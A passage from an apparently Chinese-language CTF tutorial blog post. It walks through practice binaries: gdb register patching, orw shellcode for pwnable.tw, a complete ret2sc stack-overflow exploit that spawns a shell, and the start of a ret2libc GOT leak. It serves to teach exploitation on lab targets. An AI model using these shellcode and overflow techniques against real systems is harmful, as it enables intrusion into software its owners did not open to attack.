+<p>補充：<br>“&#x2F;bin&#x2F;sh”字串位置可以在libc找到;system參數只要”sh”，也可以只找”sh”這個字串就好。</p>
+<p>最後做<a href="#Lab4">Lab4</a>練習看看吧~</p>
+<h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><h3 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h3><p>這題的作法很多，我自己摸出來的做法是：<br>首先先看source code<br>![](<a class="link"   target="_blank" rel="noopener" href="https://i.imgur.com/EiiFUXI.png" >https://i.imgur.com/EiiFUXI.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;1000x300)<br>會發現程式的邏輯就是把你輸入的字串和password比對，一樣的話就印出flag。<br>大概了解題意後就開始動工<br>我上網查過一些作法是leak出password，然後輸入password就能印出flag了。<br>我這邊的做法是下斷點在if判斷的instruction，先反組譯get_flag()函式</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="function">disas <span class="title">get_flag</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/iC6N1El.png"
+                     
+                ><br>會在裡面看到組合語言的cmp，就相當於source裡面的if判斷式，把斷點下在這行(0x08048720)，然後執行起來。</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">break</span> *<span class="number">0x08048720</span></span><br><span class="line">$ r</span><br></pre></td></tr></table></figure></div>
+<p>這邊會要你輸入magic，就隨便輸入就好了，反正後面會再做修改<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/CwN3ZRM.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/wfrte4m.png"
+                     
+                ><br>可以看到程式跑到斷點，在做cmp的instruction了，這裡在比較edx和eax的值，eax是你輸入的magic，edx是password，這邊我的想法就是把其中一個的值改成另一個的值就過這條判斷式了!<br>那就用set這個指令去改</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ set $eax=$edx</span><br><span class="line">$ ni</span><br><span class="line">$ <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>
+<p>這樣就成功拿到flag囉</p>
+<h3 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h3><p>這題就是自己寫shellcode，去做read、write、open<br>題目可以去pwnable.tw找<a class="link"   target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#2" >orw <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>這題，</p>
+<p>檔案的位置在&#x2F;home&#x2F;orw&#x2F;flag，用剛剛的hello world的模板來改，最後的shellcode長這樣</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> 1 from pwn import *</span><br><span class="line"> 2</span><br><span class="line"> 3 #r = process(&quot;./orw.bin&quot;)</span><br><span class="line"> 4 r = remote(&quot;chall.pwnable.tw&quot;,10001)</span><br><span class="line"> 5</span><br><span class="line"> 6 sc = asm(</span><br><span class="line"> 7 &quot;&quot;&quot;</span><br><span class="line"> 8     jmp hello</span><br><span class="line"> 9 write :</span><br><span class="line">10     pop ebx</span><br><span class="line">11     mov eax,5</span><br><span class="line">12     mov ecx,0</span><br><span class="line">13     int 0x80</span><br><span class="line">14     </span><br><span class="line">15     mov ebx,eax</span><br><span class="line">16     mov ecx,esp</span><br><span class="line">17     mov edx,0x60</span><br><span class="line">18     mov eax,3</span><br><span class="line">19     int 0x80</span><br><span class="line">20</span><br><span class="line">21     mov edx,eax</span><br><span class="line">22     mov ebx,1</span><br><span class="line">23     mov eax,4</span><br><span class="line">24     int 0x80</span><br><span class="line">25</span><br><span class="line">26     mov eax,1</span><br><span class="line">27     int 0x80</span><br><span class="line">28</span><br><span class="line">29 hello :</span><br><span class="line">30     call write</span><br><span class="line">31     .ascii &quot;/home/orw/flag&quot;</span><br><span class="line">32     .byte 0</span><br><span class="line">33</span><br><span class="line">34 &quot;&quot;&quot;</span><br><span class="line">35 )</span><br><span class="line">36</span><br><span class="line">37 r.recvuntil(&quot;:&quot;)</span><br><span class="line">38 r.sendline(sc)</span><br><span class="line">39 r.interactive()</span><br></pre></td></tr></table></figure></div>
+<p> 首先前面做的都差不多，先jmp到hello然後call write的時候會把下一行的字串push到stack頂端，進到write的時候<strong>先寫open()的shellcode(10~13)：</strong><br>首先先</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop ebx</span><br></pre></td></tr></table></figure></div>
+<p>把stack頂端(剛剛push進去的字串)存到ebx，第31行要記得改成題目說的檔案位置&#x2F;home&#x2F;orw&#x2F;flag。<br>在syscall的<a class="link"   target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=x86" >document <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中可以看到open的ebx要放file name，這邊pop ebx就成功設定好ebx這個參數了。<br>這邊要注意<strong>ebx要放絕對路徑</strong></p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,5</span><br></pre></td></tr></table></figure></div>
+<p>這邊是設定eax為5，5是open這個system call的numer，在剛剛的document中都可以看到<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/iWIBuXa.png"
+                     
+                ></p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,0</span><br></pre></td></tr></table></figure></div>
+<p>ecx放flag<br>這邊flag放0應該是指read-only<br><a class="link"   target="_blank" rel="noopener" href="https://blog.jaycetyle.com/2018/12/linux-fd-open-close/" >ref <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>不太確定<br>文章裡面說一定要有這個參數，我刪掉後還是可以拿到flag(X</p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int 0x80</span><br></pre></td></tr></table></figure></div>
+<p>這是呼叫system call的意思，這時候就會根據eax的值去決定要做那個function，檢查eax，ebx，ecx那些參數。</p>
+<p>到這邊open()的Assembly就做完了</p>
+<p><strong>接下來(15~19行)是做read()</strong><br>首先</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax</span><br></pre></td></tr></table></figure></div>
+<p>剛剛open()完會回傳fd(file description)也就是這個檔案的描述到<br>eax，read()的ebx是放fd的，所以第一行先把eax的值(fd)給ebx</p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,esp</span><br></pre></td></tr></table></figure></div>
+<p>ecx是放buffer的地方，那就把esp給ecx就可以了<br>buffer是指兩個程式傳遞東西的速度不同，需要一個緩衝區去放待處裡的檔案的地方，這邊就隨便放esp就可以了，沒特別指定要放哪裡。</p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx,0x60</span><br></pre></td></tr></table></figure></div>
+<p>edx是放size的地方，這邊沒說size多少，就隨便放(不要太小)。</p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,3</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></div>
+<p>這跟剛剛一樣，讓system call可以知道要呼叫read()</p>
+<p>以上是read()的部分</p>
+<p><strong>最後是write()(21~24)的部分</strong><br>首先</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx,eax</span><br></pre></td></tr></table></figure></div>
+<p>eax會回傳讀取的長度，這邊write的size也是放在edx，所以就把eax的值給edx。</p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,1</span><br></pre></td></tr></table></figure></div>
+<p>ebx放fd，給1代表stdout輸出。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,4</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></div>
+<p>這邊應該不陌生了，就是system call write()</p>
+<p>到這邊這題就差不多了，最後別忘記exit()</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,1</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></div>
+<p>離開程式。</p>
+<p>到這邊shellcode就大功告成了~</p>
+<p>pwntool的話簡單的介紹一下：<br>首先</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 引用pwntool這個函式庫</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./orw.bin&quot;)</span></span><br><span class="line"><span class="comment"># 這邊process(&quot;[binary]&quot;)是指在本地跑檔案的意思，我後來連到pwnable.tw去解題所以不需要本地跑</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment"># 這個就是連線到別人架的題目remote(&quot;[url],port&quot;)</span></span><br></pre></td></tr></table></figure></div>
+<p>還有最後的</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="comment"># 讓程式讀到&quot;:&quot;這個字元</span></span><br><span class="line"></span><br><span class="line">r.sendline(sc)</span><br><span class="line"><span class="comment"># 讓程式送出sc(也就是剛剛寫的那一大串shellcode)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># 切換到互動模式，如果拿到shell後可以輸入指令跟Terminal互動</span></span><br></pre></td></tr></table></figure></div>
+<p>最後用python去跑這個腳本就可以拿到flag囉!!</p>
+<h3 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h3><p><code>$ ncat -ve ./ret2sc -kl 6969</code><br>先把題目架好<br>這題是ret2sc，先看source code</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,name,<span class="number">50</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try your best:&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到這邊buf的size是20，但是下面用gets讀入，gets是一個很危險的函式，因為gets可以一直讀入東西，不會有長度的限制。<br>所以攻擊點在gets(buf)這邊。</p>
+<p>整體的攻擊思路就是先輸入shellcode到name，然後在buf的地方overflow跳到前面name的地方去執行shellcode。</p>
+<p>先檢查保護機制，先進到gdb之後再打這個</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ checksec</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/XfD1XPl.png"
+                     
+                ><br>可以看到幾乎都是關的，那就不用再特別處裡bypass的部分<br>一開始先找offset要塞多少，用剛剛提到的cyclic先產生一大坨字串<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/DLYwppF.png"
+                     
+                ><br>然後我塞到輸入buf的部分，也就是”Try your best:”輸入的地方<br>然後用gdb去看EIP會發現是”iaaa”<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/JKL2KEi.png"
+                     
+                ><br>再用<code>$ cyclic_find(&quot;iaaa&quot;)</code>去看offset的長度是32<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/03avyEM.png"
+                     
+                ><br>那就可以開始寫exploit了!!<br>基本模板先寫好</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host = localhost</span><br><span class="line">port = <span class="number">6969</span> <span class="comment"># 我架在port6969</span></span><br><span class="line"></span><br><span class="line">r = remote(host,port)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>然後要先找到name這個function的address，這是我要跳到的function<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/djCA3xk.png"
+                     
+                ><br>可以用gdb或是nm<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/0xzMYY0.png"
+                     
+                ><br>找到name的位置在0x804a060</p>
+<p>知道offset要塞多少，也知道要跳的目標函式位址，就可以開始寫exploit(攻擊腳本)了</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2sc&#x27;</span>)</span><br><span class="line"><span class="comment"># 在本地跑這隻程式，也可以用ncat架到自己的localhost連線，方法上面有寫</span></span><br><span class="line">name_addr = <span class="number">0x804a060</span></span><br><span class="line"><span class="comment"># 剛剛找到name的函式位址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span></span><br><span class="line"><span class="comment"># 剛剛查證過offset是32</span></span><br><span class="line">payload += p32(name_addr)</span><br><span class="line"><span class="comment"># 要用p32轉成byte的形式</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="comment"># 先讀入Name:</span></span><br><span class="line">r.sendline(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment"># 這是pwntool的工具，可以直接弄出現成的shellcode</span></span><br><span class="line"><span class="comment"># 這邊實作上面的想法，在讀入Name:後輸入shellcode給他吃</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="comment"># 這邊是在讀入Try Your Best:</span></span><br><span class="line"><span class="comment"># 這邊要輸入payload讓他觸發overflow然後跳到name的地方(剛剛塞shellcode的地方)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="comment"># 送出payload，完成</span></span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># 切換到互動模式，可以輸入一些指令確定你是否成功拿到shell，例如:ls，id，pwd</span></span><br></pre></td></tr></table></figure></div>
+<p>完成~</p>
+<h3 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h3><p>先看c的code</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">2</span></span><br><span class="line"> <span class="number">3</span> <span class="type">void</span> <span class="title function_">See_something</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> addr)</span>&#123;</span><br><span class="line"> <span class="number">4</span>     <span class="type">int</span> *address ;</span><br><span class="line"> <span class="number">5</span>     address = (<span class="type">int</span> *)addr ;</span><br><span class="line"> <span class="number">6</span>     <span class="built_in">printf</span>(<span class="string">&quot;The content of the address : %p\n&quot;</span>,*address);                                                                     <span class="number">7</span> &#125;;</span><br><span class="line"> <span class="number">8</span></span><br><span class="line"> <span class="number">9</span> <span class="type">void</span> <span class="title function_">Print_message</span><span class="params">(<span class="type">char</span> *mesg)</span>&#123;</span><br><span class="line"><span class="number">10</span>     <span class="type">char</span> buf[<span class="number">48</span>];</span><br><span class="line"><span class="number">11</span>     <span class="built_in">strcpy</span>(buf,mesg);</span><br><span class="line"><span class="number">12</span>     <span class="built_in">printf</span>(<span class="string">&quot;Your message is : %s&quot;</span>,buf);</span><br><span class="line"><span class="number">13</span> &#125;</span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="number">15</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="number">16</span>     <span class="type">char</span> address[<span class="number">10</span>] ;</span><br><span class="line"><span class="number">17</span>     <span class="type">char</span> message[<span class="number">256</span>];</span><br><span class="line"><span class="number">18</span>     <span class="type">unsigned</span> <span class="type">int</span> addr ;</span><br><span class="line"><span class="number">19</span>     <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line"><span class="number">20</span>     <span class="built_in">puts</span>(<span class="string">&quot;Do you know return to library ?&quot;</span>);</span><br><span class="line"><span class="number">21</span>     <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line"><span class="number">22</span>     <span class="built_in">puts</span>(<span class="string">&quot;What do you want to see in memory?&quot;</span>);</span><br><span class="line"><span class="number">23</span>     <span class="built_in">printf</span>(<span class="string">&quot;Give me an address (in dec) :&quot;</span>);</span><br><span class="line"><span class="number">24</span>     fflush(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">25</span>     read(<span class="number">0</span>,address,<span class="number">10</span>);</span><br><span class="line"><span class="number">26</span>     addr = strtol(address);</span><br><span class="line"><span class="number">27</span>     See_something(addr) ;</span><br><span class="line"><span class="number">28</span>     <span class="built_in">printf</span>(<span class="string">&quot;Leave some message for me :&quot;</span>);</span><br><span class="line"><span class="number">29</span>     fflush(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">30</span>     read(<span class="number">0</span>,message,<span class="number">256</span>);</span><br><span class="line"><span class="number">31</span>     Print_message(message);</span><br><span class="line"><span class="number">32</span>     <span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line"><span class="number">33</span>     <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line"><span class="number">34</span> &#125;</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/fMzSgDv.png"
+                     
+                ><br>這題會要你輸入一個address，然後看address的內容，攻擊的注入點在Print_message裡面的strcpy，可以做到buffer overflow。<br>先做buffer overflow<br>首先要先餵一個10進位的address，先隨便找一個GOT的位置(我用put)。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -R ret2lib</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/xbLIzcp.png"
+                     
+                ><br>要記得先轉成10進位，直接在python打就可以了(我這邊是用python3，應該1,2,3都可)要改成hex的形式才能轉喔0804a01c-&gt;0x804a01c<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/xVYkcHU.png"
+                     
+                ><br>轉完0x804a01c(16進位)-&gt;134520860(10進位)<br>把這個10進位的數字餵進去會得到0xf7e46290<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/MgseVF4.png"
+                     
+                ><br>檢查一下0xf7e46290是不是put</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ x/x 0xf7e46290</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/3m8rFNw.png"
+                     
+                ><br>確定ok後<br>接下來要找多少bytes會蓋到return address，這邊可以用之前提過的cyclic()或是直接在gdb裡面用pattc [數字]產生一大串bytes，然後用crashoff去看是在多少的時候crash的，這邊兩種做法都提供</p>
+<h4 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic()"></a>cyclic()</h4><p>先產生bytes，到python裡面import pwntools</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line">&gt;&gt;&gt;from pwn import *</span><br><span class="line">&gt;&gt;&gt;cyclic(100)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/OcPxuUy.png"
+                     
+                ><br>產出字串先複製起來<br>接下來回到gdb，一開始還是一樣填入10進位的位置，然後填入剛剛產出的字串<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/FYdG48f.png"
+                     
+                ><br>像這樣<br>這時候去看EIP裡面是什麼<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/57lWwO6.png"
+                     
+                ><br>會發現是’paaa’<br>回到python，用這個指令就可以知道要塞多少</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line">&gt;&gt;&gt;from pwn import *</span><br><span class="line">&gt;&gt;&gt;cyclic_find(&#x27;paaa&#x27;)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/t3QdxZq.png"
+                     
+                ><br>可以得到是60</p>
+<h4 id="pattc"><a href="#pattc" class="headerlink" title="pattc"></a>pattc</h4><p>這是gdb裡面的指令，先打</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gdb</span><br><span class="line">$ pattc 100</span><br></pre></td></tr></table></figure></div>
+<p>用法就是pattc [數字]，一樣可以產出一串byte<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/Q5DlL6B.png"
+                     
+                ><br>接下來把程式跑起來然後填入put位置和剛剛產出來的bytes<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/0zIY7kA.png"
+                     
+                ><br>然後打</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crashoff</span><br></pre></td></tr></table></figure></div>
+<p>就可以知道要塞多少囉<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/EMpnBfX.png"
+                     
+                ><br>一樣是60</p>
+<p>到這邊就可以開始寫exploit了<br>這邊有不懂的程式碼可以參考上面的exploit，上面有註解很仔細<br>主要分成四個部分</p>
+<ul>
+<li>送出puts的offset</li>
+<li>接收puts的addr</li>
+<li>算出payload需要的各種位置</li>
+<li>送payload</li>
+</ul>
+<h4 id="送出puts的offset"><a href="#送出puts的offset" class="headerlink" title="送出puts的offset"></a>送出puts的offset</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                                                                               r = process(<span class="string">&#x27;./ret2lib&#x27;</span>)</span><br><span class="line"></span><br><span class="line">put_got = <span class="number">0x804a01c</span></span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(put_got))</span><br><span class="line"><span class="comment">#送出put的offset</span></span><br></pre></td></tr></table></figure></div>
+<p>這邊put_got的位置可以用<code>$ objdump -R ret2lib</code>找到<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/5js9CxX.png"
+                     
+                ><br>送出記得轉成字串</p>
